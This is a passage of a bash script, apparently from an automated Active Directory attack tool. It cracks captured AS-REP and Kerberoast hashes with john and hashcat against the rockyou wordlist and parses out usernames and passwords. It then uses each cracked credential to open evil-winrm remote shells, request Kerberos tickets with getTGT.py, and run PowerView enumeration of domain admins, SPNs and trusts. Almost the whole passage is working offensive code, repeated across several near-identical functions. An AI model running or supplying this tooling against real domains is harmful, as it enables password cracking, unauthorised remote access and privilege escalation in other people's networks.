send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c '
export DC=\"'$DC'\"
export CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
export Ip=\"'$Ip'\"
user=\"'\$user'\"
p=\"'\$p'\"

echo -e \"\e[1;32m[+] User: \$user\e[0m\"
echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"

echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
echo ''
echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m\"
echo ''
evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"

if [ \$? -ne 0 ]; then
    echo \"\"
    echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m\"
    echo \"\"

    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
    echo \"\"

    if [ -f \"\${user}.ccache\" ]; then
        export KRB5CCNAME=\$PWD/\${user}.ccache
        echo \"\"
        echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
        echo ''   
        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
        if [ \$? -ne 0 ]; then
            echo \"\"
            echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\"
            echo \"\"
        fi
    else
        echo -e \"\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m\"
        echo \"\"
    fi
fi
exec bash'
    done
else
    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi

exec bash
"
}
getnpusers_check1(){
cat << 'EOF' >> /tmp/auto3.sh
getnpusers_check(){
  gnome-terminal -- bash -c "
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
export Kerberos='__$Kerberos__'

HASH_FILE='/tmp/.asrep1.txt'
WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking krb5asrep Hash --[+]\e[0m'
echo ''
john \$HASH_FILE --wordlist=\$WORDLIST
echo ''

cracked=\$(john --show \"\$HASH_FILE\" | grep '@' | grep ':' | grep -v '^$')

if [ -n \"\$cracked\" ]; then
  echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
  echo ''
  echo \"\$cracked\"
  echo ''

  echo \"\$cracked\" | while IFS= read -r line; do
    [[ -z \"\$line\" ]] && continue

    user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d':' -f1 | sed 's/@.*//')
    p=\$(echo \"\$line\" | cut -d':' -f2-)
    cat << EOT > /tmp/temp4.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOT
        chmod +x /tmp/temp4.sh
        bash /tmp/temp4.sh
  	gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c \"
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
user='\$user'
p='\$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Ip: \$Ip\e[0m'

echo -e '\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m'
echo ''  
evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"

if [ \$? -ne 0 ]; then
  echo ''
  echo -e '\e[1;33m[!] Evil-WinRM failed. Trying getTGT and Kerberos auth ...\e[0m'
  echo ''
  getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\"
  echo ''

  if [ -f \"\${user}.ccache\" ]; then
    export KRB5CCNAME=\$PWD/\${user}.ccache
    echo ''
    echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m'
    echo ''  
    evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
    if [ \$? -ne 0 ]; then
      echo ''
      echo -e '\e[1;33m[!] Still failed. Possibly not in Remote Management Group.\e[0m'
    fi
  else
    echo -e '\e[1;31m[-] getTGT failed. No .ccache for \$user.\e[0m'
  fi
fi
exec bash\"
  done
else
  echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi
exec bash"
}
EOF
}

getnpusers_check(){
    gnome-terminal -- bash -c "
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export Ip='$Ip'
export Kerberos='$Kerberos'

HASH_FILE='/tmp/.asrep1.txt'
WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking krb5asrep Hash --[+]\e[0m'
echo ''
john \"\$HASH_FILE\" --wordlist=\"\$WORDLIST\"
echo ''

cracked=\$(john --show \"\$HASH_FILE\")

if [ -n \"\$cracked\" ]; then
    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
    echo ''
    echo \"\$cracked\"
    echo ''



    echo \"\$cracked\" | grep -v 'password' | while IFS= read -r line; do
    [[ -z \"\$line\" ]] && continue

    user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d':' -f1 | sed 's/@.*//')
    p=\$(echo \"\$line\" | cut -d':' -f2-)

cat << EOF > /tmp/temp1.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOF

        chmod +x /tmp/temp1.sh
        bash /tmp/temp1.sh
        gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export Ip='$Ip'
user=\\\"$user\\\"
p=\\\"$p\\\"

echo -e '\\e[1;32m[+] User: '\$user'\\e[0m'
echo -e '\\e[1;32m[+] Password: '\$p'\\e[0m'
echo -e '\\e[1;32m[+] DC: '\$DC'\\e[0m'
echo -e '\\e[1;32m[+] Domain: '\$CLEAN_DOMAIN'\\e[0m'
echo -e '\\e[1;32m[+] Ip: '\$Ip'\\e[0m'

echo -e '\\e[1;32m[+] Trying Evil-WinRM direct auth for '\$user' ...\\e[0m'
echo ''
echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m'
echo ''
evil-winrm -i '\$DC' -u '\$user' -p '\$p'
if [ \$? -ne 0 ]; then
    echo ''
    echo -e '\\e[1;33m[!] Evil-WinRM failed for '\$user'. Trying getTGT.py and Kerberos auth ..\\e[0m'
    echo ''

    getTGT.py '\$CLEAN_DOMAIN/\$user:\$p' -dc-ip '\$Ip' -k
    echo ''

    if [ -f \"\${user}.ccache\" ]; then
        mv \"\${user}.ccache\" \"/tmp/\${user}.ccache\"
        export KRB5CCNAME=\"/tmp/\${user}.ccache\"
        echo ''
        echo -e '\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m'
        echo ''   
        evil-winrm -i '\$DC' -u '\$user' -r '\$CLEAN_DOMAIN'
        if [ \$? -ne 0 ]; then
            echo ''
            echo -e '\\e[1;33m[!] Evil-WinRM failed for '\$user' again with ticket .. maybe user not in Remote Management Group\\e[0m'
            echo ''
        fi
    else
        echo -e '\\e[1;31m[-] getTGT.py failed. No ccache found for '\$user'.\\e[0m'
        echo ''
    fi
fi
exec bash\"
    done
else
    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi

exec bash"
}

targeted_kerberoast_check1(){
      cat << 'EOF' >> /tmp/auto1.sh
         targeted_kerberoast_check(){
            gnome-terminal -- bash -c "
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
export Kerberos='__$Kerberos__'

u=\$(cat /tmp/.current_u.txt)
HASH_FILE=\"/tmp/.tgs1.txt.\$u\"

WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking targeted_Kerberoast Hash --[+]\e[0m'
echo ''
while pgrep -x hashcat > /dev/null; do
    echo 'Hashcat is still running, waiting...'
    sleep 10
done
hashcat -m 13100 \$HASH_FILE \$WORDLIST
echo ''

cracked=\$(hashcat -m 13100 --show \$HASH_FILE)

if [ -n \"\$cracked\" ]; then
    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
    echo ''
    echo \"\$cracked\"
    echo ''

    echo \"\$cracked\" | while IFS= read -r line; do
        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)
        cat << EOT > /tmp/temp3.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOT
        chmod +x /tmp/temp3.sh
        bash /tmp/temp3.sh
  gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c '
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
user=\"'\$user'\"
p=\"'\$p'\"

echo -e \"\e[1;32m[+] User: \$user\e[0m\"
echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"

echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
echo \"\"
echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m\"
echo \"\"  
evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"

if [ \$? -ne 0 ]; then
    echo \"\"
    echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m\"
    echo \"\"

    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
    echo \"\"

    if [ -f \"\${user}.ccache\" ]; then
        export KRB5CCNAME=\$PWD/\${user}.ccache
        echo \"\"
	echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
        echo \"\"
        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
        if [ \$? -ne 0 ]; then
            echo \"\"
            echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\"
            echo \"\"
        fi
    else
        echo -e \"\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m\"
        echo \"\"
    fi
fi
exec bash'
    done
else
    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi

exec bash
"

}
EOF

}

targeted_kerberoast_check() {
    gnome-terminal -- bash -c "
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export Ip='$Ip'
export Kerberos='$Kerberos'

u=\$(cat /tmp/.current_u.txt)
HASH_FILE=\"/tmp/.tgs1.txt.\$u\"

WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking targeted_Kerberoast Hash --[+]\e[0m'
echo ''

while pgrep -x hashcat > /dev/null; do
    echo 'Hashcat is still running, waiting...'
    sleep 10
done
hashcat -m 13100 \"\$HASH_FILE\" \"\$WORDLIST\"
echo ''

cracked=\$(hashcat -m 13100 --show \"\$HASH_FILE\")

if [ -n \"\$cracked\" ]; then
    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
    echo ''
    echo \"\$cracked\"
    echo ''

    echo \"\$cracked\" | while IFS= read -r line; do
        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)

        cat << EOF > /tmp/temp.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOF

        chmod +x /tmp/temp.sh
        bash /tmp/temp.sh
        gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
